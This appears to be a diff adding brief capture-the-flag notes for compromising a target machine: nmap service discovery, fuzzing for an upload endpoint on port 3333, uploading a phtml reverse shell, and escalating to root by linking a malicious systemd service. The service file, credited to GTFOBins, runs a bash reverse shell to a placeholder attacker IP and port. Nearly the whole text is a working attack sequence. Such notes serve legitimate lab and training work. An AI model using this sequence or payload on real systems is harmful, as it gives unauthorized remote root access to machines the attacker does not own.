@@ -1,0 +1,19 @@
+service discovery with nmap
+
+Find the upload endpoint on the target running on port 3333 using directory fuzzing
+
+upload a phtml reverse shell on the target as apache understand the extension
+
+discover the suid bits available
+
+use systemctl link /path/to/malService
+
+service file should contain (from gtfobins)
+
+[Unit]
+Description=Root Shell #Optional
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/AttackerIP/Port 0>&1'
+[Install]
+WantedBy=multi-user.target
